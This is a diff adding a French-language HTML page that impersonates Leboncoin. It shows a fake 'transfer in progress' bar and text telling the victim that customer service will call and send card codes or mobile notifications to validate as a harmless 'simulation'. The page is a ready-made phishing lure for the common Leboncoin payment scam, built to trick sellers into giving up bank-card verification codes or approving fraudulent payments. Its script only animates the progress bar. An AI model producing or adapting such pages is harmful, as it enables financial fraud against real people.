@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Vérification en cours</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+
+    #headerLogo {
+      margin: 10px 0;
+      width: 120px;
+      height: auto;
+    }
+
+    .evolution-chain {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      gap: 16px;
+      margin-top: 10px;
+      max-width: 360px;
+      padding: 0 10px;
+      overflow-x: auto;
+    }
+
+    .step {
+      text-align: center;
+      font-size: 13px;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      min-width: 55px;
+      flex-shrink: 0;
+    }
+
+    .step span.title {
+      margin-bottom: 4px;
+      font-weight: 700;
+      font-size: 13px;
+      color: #000;
+    }
+
+    .circle {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background-color: #FF5A00;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      box-sizing: border-box;
+    }
+
+    .checkmark {
+      font-size: 13px;
+      color: white;
+      user-select: none;
+    }
+
+    .line {
+      position: absolute;
+      top: 65%;
+      left: 100%;
+      width: 18px;
+      height: 2px;
+      background-color: #FF5A00;
+      margin-top: -1px;
+      user-select: none;
+    }
+
+    .step:last-child .line {
+      display: none;
+    }
+
+    main {
+      padding: 15px;
+      width: 100%;
+      max-width: 360px;
+      background-color: white;
+      margin: 15px 0 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      box-sizing: border-box;
+      position: relative;
+      text-align: left;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #28a745;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+
+    .loading-container {
+      position: relative;
+      width: 90vw;
+      max-width: 320px;
+      height: 12px;
+      background-color: #ddd;
+      border-radius: 10px;
+      margin: 15px auto 0;
+    }
+
+    .loading-bar {
+      width: 0%;
+      height: 100%;
+      background-color: #28a745;
+      border-radius: 10px 0 0 10px;
+      transition: width 0.2s ease-in-out;
+    }
+
+    .percentage {
+      position: absolute;
+      top: -22px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 14px;
+      font-weight: bold;
+      color: #28a745;
+      user-select: none;
+    }
+
+    .message-panel {
+      display: none;
+      background-color: #ffecb3;
+      border: 2px solid #f5c400;
+      color: #333;
+      padding: 8px;
+      border-radius: 6px;
+      width: 90%;
+      max-width: 320px;
+      text-align: center;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      position: relative;
+      margin: 15px auto 0;
+      animation: messageAnimation 0.3s ease-out;
+      box-sizing: border-box;
+    }
+
+    @keyframes messageAnimation {
+      0% {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .message-panel .message-text {
+      font-size: 16px;
+      font-weight: bold;
+      user-select: none;
+    }
+
+    .additional-text {
+      font-size: 16px;
+      font-weight: normal;
+      color: #333;
+      margin-top: 15px;
+      text-align: center;
+      line-height: 1.4;
+      max-width: 360px;
+      margin-left: auto;
+      margin-right: auto;
+      user-select: none;
+    }
+
+    .important-text {
+      color: #ff0000;
+      font-weight: bold;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+      user-select: none;
+    }
+
+    .info-legale {
+      background-color: #f0f0f0;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+      margin-top: 20px;
+      text-align: left;
+      max-width: 360px;
+      margin-left: auto;
+      margin-right: auto;
+      box-sizing: border-box;
+      user-select: none;
+    }
+
+    .info-legale strong {
+      color: #ff0000;
+    }
+  </style>
+</head>
+<body>
+
+  <img id="headerLogo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo Leboncoin" />
+
+  <div class="evolution-chain" aria-label="Barre d'évolution des étapes">
+    <div class="step">
+      <span class="title">Confirmer</span>
+      <div class="circle">
+        <div class="checkmark">✔</div>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="step">
+      <span class="title">Checkpoint</span>
+      <div class="circle">
+        <div class="checkmark">✔</div>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="step">
+      <span class="title">Vérifier</span>
+      <div class="circle">
+        <div class="checkmark">✔</div>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="step">
+      <span class="title">Complete</span>
+      <div class="circle">
+        <div class="checkmark">✔</div>
+      </div>
+    </div>
+  </div>
+
+  <main>
+    <h1>Virement en cours...</h1>
+
+    <div class="loading-container" id="loadingContainer">
+      <div class="percentage" id="percentage">0%</div>
+      <div class="loading-bar" id="loadingBar"></div>
+    </div>
+
+    <div class="message-panel" id="messagePanel">
+      <div class="message-text">Lisez le texte ci-dessous</div>
+    </div>
+
+    <div class="additional-text" id="additionalText">
+      Suite aux nouvelles mesures de sécurité, vous recevrez vos fonds sur votre compte uniquement après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte <strong>LEBONCOIN</strong>. Pour finaliser la confirmation de votre compte, vous serez contacté au téléphone par notre service client dans les meilleurs délais. Afin de lutter contre les fraudes à la carte bancaire, nous procéderons à une simulation en vous faisant parvenir différents codes avec votre carte bancaire ou des notifications à valider avec votre mobile.
+    </div>
+
+    <div class="important-text">
+      NB : Vous verrez des montants aléatoires générés par les serveurs de simulations <strong>LEBONCOIN</strong>, mais nous vous rassurons que vous ne serez ni débité, ni prélevé.
+    </div>
+
+    <div class="info-legale">
+      <p><strong>Information légale :</strong> Attention, l'usage frauduleux du numéro de carte bancaire d'une autre personne sans son consentement constitue juridiquement un délit d’escroquerie, sanctionné par l'article 313-1 du Code pénal, d'une peine de 5 ans d’emprisonnement et 35 000 € d'amende.</p>
+    </div>
+  </main>
+
+  <script>
+    $(document).ready(function() {
+      let percentage = 0;
+      const percentageDisplay = document.getElementById('percentage');
+      const loadingBar = document.getElementById('loadingBar');
+      const messagePanel = document.getElementById('messagePanel');
+      const loadingContainer = document.getElementById('loadingContainer');
+
+      const interval = setInterval(() => {
+        percentage++;
+        percentageDisplay.textContent = `${percentage}%`;
+        loadingBar.style.width = `${percentage}%`;
+
+        if (percentage >= 90) {
+          clearInterval(interval);
+
+          setTimeout(() => {
+            loadingContainer.style.display = 'none';
+          }, 300);
+
+          setTimeout(() => {
+            messagePanel.style.display = 'block';
+          }, 300);
+        }
+      }, 40);
+    });
+  </script>
+</body>
+</html>
